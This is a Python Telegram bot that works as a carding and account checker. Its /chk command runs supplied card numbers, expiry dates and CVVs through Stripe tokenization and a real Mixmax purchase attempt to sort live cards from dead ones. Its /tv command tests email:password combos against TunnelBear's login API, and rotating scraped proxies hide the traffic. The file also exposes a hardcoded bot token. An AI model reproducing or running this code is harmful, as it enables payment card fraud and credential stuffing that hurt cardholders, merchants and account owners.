#!/usr/bin/python3
import logging
import os
import requests
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None) 
PREFIX = "!/"

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token="5394930865:AAFgyOr7umbTCu2ZQSITx-mqSvRWH-3XUCU", parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
r = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=20&country=all&ssl=all&anonymity=all&simplified=true').text
res = r.partition('\n')[0]
proxy = {"http": f"http://{res}"}
session = requests.session()

session.proxies = proxy #UNCOMMENT IT AFTER PROXIES

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(
        "Hello how to use <code>/chk cc/mm/yy/cvv</code>\nREPO <a href='https://github.com/Gamhern6807'>Here</a>"
    )
    

@dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
async def tv(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    ac = message.text[len('/tv '):]
    splitter = ac.split(':')
    email = splitter[0]
    password = splitter[1]
    if not ac:
        return await message.reply(
            "<code>Send ac /tv email:pass.</code>"
        )
    payload = {
        "username": email,
        "password": password,
        "withUserDetails": "true",
        "v": "web-1.0"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                     data=payload, headers=headers)
    toc = time.perf_counter()
    
    # capture ac details
    if "Access denied" in r.text:
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ❌WRONG DETAILS
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    elif "PASS" in r.text:
        res = r.json()
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ✅VALID
<b>LEVEL</b>➟ {res['details']['bearType']}
<b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply("Error❌: REQ failed")
        
        
@dp.message_handler(commands=["bin"], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("Send bin not ass")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    r = requests.get(f"https://bins.ws/search?bins={BIN}&bank=&country=").text
    soup = BeautifulSoup(r, features="html.parser")
    k = soup.find("div", {"class": "page"})
    INFO = f"""
═════════╕
<b>BIN INFO</b>
<code>{k.get_text()[62:]}</code>
CheckedBy: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot:</b> @BrumakBot
╘═════════
"""
    await message.reply(INFO)
        
    
@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    cc = message.text[len('/chk '):]
    splitter = cc.split('|')
    ccn = splitter[0]
    mm = splitter[1]
    yy = splitter[2]
    cvv = splitter[3]
    email = f"{str(rnd)}@gmail.com"
    if not cc:
        return await message.reply(
            "<code>Send Card /chk cc|mm|yy|cvv.</code>"
        )   
    #BIN = cc[:6]
    #if BIN in BLACKLISTED:
    #    return await message.reply("<b>BLACKLISTED BIN</b>")
    
    url = "https://api.stripe.com/v1/tokens"

    headers = {
        'authority': 'api.stripe.com',
        'method': 'POST',
        'path': '/v1/tokens',
        'scheme': 'https',
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'es-419,es;q=0.9',
        'content-length': '391',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
        }

    postdata = {
        'card[name]': 'jose lopez',
        'card[number]': ccn,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': '6dae3264-48ca-411d-8ded-383f0ae07e6c4a1d3c',
        'muid': 'ac1942e0-6930-4798-9f74-9ad43d9fdc35eb2748',
        'sid': '65a4b2e2-bc25-4b3a-9fe6-c22a6f02a62dd7cf54',
        'payment_user_agent': 'stripe.js/f0346bf10; stripe-js-v3/f0346bf10',
        'time_on_page': '59424',
        'key': 'pk_live_BssIav0BSd7QyAEoguHrrr0U',
        'pasted_fields': 'number',
        }

    pos = session.post(url=url,headers=headers,data=postdata)
    resp = pos.json()
    token = resp["id"]

    url = "https://app.mixmax.com/api/purchases"

    headers = {
        'authority': 'app.mixmax.com',
        'method': 'POST',
        'path': '/api/purchases',
        'scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'es-419,es;q=0.9',
        'content-length': '712',
        'content-type': 'application/json',
        'cookie': 'initialMixmaxURL=https%3A%2F%2Fwww.mixmax.com%2F; initialExternalReferrerURL=; lastMixmaxURL=https%3A%2F%2Fwww.mixmax.com%2F; lastExternalReferrerURL=; __stripe_mid=ac1942e0-6930-4798-9f74-9ad43d9fdc35eb2748; __stripe_sid=65a4b2e2-bc25-4b3a-9fe6-c22a6f02a62dd7cf54',
        'origin': 'https://app.mixmax.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        }

    postdata = '{"token":{"id":"'+token+'","object":"token","card":{"id":"card_1LJm9JDGECUvy6xjFGS6oBRq","object":"card","address_city":"","address_country":"","address_line1":"","address_line1_check":"","address_line2":"","address_state":"","address_zip":"","address_zip_check":"","brand":"Visa","country":"US","cvc_check":"unchecked","dynamic_last4":"","exp_month":"10","exp_year":"2025","funding":"debit","last4":"7117","name":"jose lopez","tokenization_method":""},"client_ip":"187.187.227.236","created":"1657405757","livemode":"true","type":"card","used":"false"},"name":"jose lopez","email":"joseeelopez@gmail.com","featureName":"mixmaxPremiumAnnualOct2017","coupon":"","location":"homepage - pricing"}'

    rx = session.post(url=url, headers= headers, data = postdata)
    res = rx.json()
    msg = res["message"]
    print(msg)
    toc = time.perf_counter()
    if "incorrect_cvc" in rx.text:
        await message.reply(f"""
✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    elif "Unrecognized request URL" in rx.text:
        await message.reply("[UPDATE] PROXIES ERROR")
    elif rx.status_code == 200:
        await message.reply(f"""
✔️<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply(f"""
❌<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")  
    
    
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
